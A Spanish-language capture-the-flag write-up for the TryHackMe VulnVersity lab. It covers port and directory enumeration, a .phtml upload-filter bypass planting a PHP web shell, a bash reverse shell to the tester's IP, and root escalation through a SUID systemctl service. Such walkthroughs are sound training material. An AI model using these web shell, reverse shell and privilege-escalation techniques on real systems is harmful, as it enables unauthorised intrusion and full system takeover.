# VulnVersity - TryHackMe
**IP:** 10.10.21.16

## Enumeración
```bash
nmap -sC -sV -p- --open --min-rate 5000 -Pn 10.10.21.16
wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.21.16:3333/FUZZ
```
Servidor web en el puerto 3333. El fuzzing revela `/internal` con un formulario de subida.

## Foothold - bypass de subida (.phtml)
El filtro bloquea `.php` pero no `.phtml`. Subimos una webshell:
```php
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```
```bash
# RCE:
http://10.10.21.16:3333/internal/uploads/shell.phtml?cmd=id
# reverse shell:
...?cmd=bash -c 'bash -i >& /dev/tcp/<mi_ip>/1234 0>&1'
```
Shell como `www-data`.

## Escalada - SUID systemctl
```bash
find / -perm -4000 2>/dev/null
# /bin/systemctl
```
Con SUID, `systemctl` crea y arranca un servicio malicioso como root:
```bash
eop=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output; chmod 666 /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop
/bin/systemctl link $eop
/bin/systemctl enable --now $eop
```
Leemos la flag de root en `/tmp/output`.
